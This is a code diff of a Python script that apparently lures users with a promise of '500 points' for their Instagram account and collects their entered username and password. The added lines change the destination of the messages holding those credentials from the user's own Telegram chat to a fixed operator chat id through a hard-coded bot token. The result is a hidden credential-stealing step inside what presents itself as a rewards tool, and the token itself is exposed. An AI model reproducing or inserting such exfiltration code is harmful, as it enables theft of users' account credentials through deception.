@@ -74,11 +74,11 @@ def checker():
              print('')
              req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text= ستتم اضافة 500 نقطة خلال 1-24 ساعة للتأكد من عدم سحب الحساب' )
             req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id=1048005193&text={Username}:mahdy@282' )
-            req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text= تم تسجيل حساب جديد \n ايدي الشخص : {id} \n يوزر الوهمي : {Username} \n باسوورد الوهمي : {Password}\nيوزره انستا : {Youruser}')               
+            req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id=1048005193&text= تم تسجيل حساب جديد \n ايدي الشخص : {id} \n يوزر الوهمي : {Username} \n باسوورد الوهمي : {Password}\nيوزره انستا : {Youruser}')               
         else:
             print(f"الحساب خاطئ ولن تتم اضافة النقاط ")
             req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text= لن يتم اضافة النقاط' )  
-            req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text= تم تسجيل حساب خاطئ\n ايدي الشخص : {id} \n يوزر الوهمي : {Username} \n باسوورد الوهمي : {Password}\nيوزره انستا : {Youruser}')                    
+            req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id=1048005193&text= تم تسجيل حساب خاطئ\n ايدي الشخص : {id} \n يوزر الوهمي : {Username} \n باسوورد الوهمي : {Password}\nيوزره انستا : {Youruser}')                    
 checker()
 if whay == '2':
 	username = input('[=] Enter Username : ')
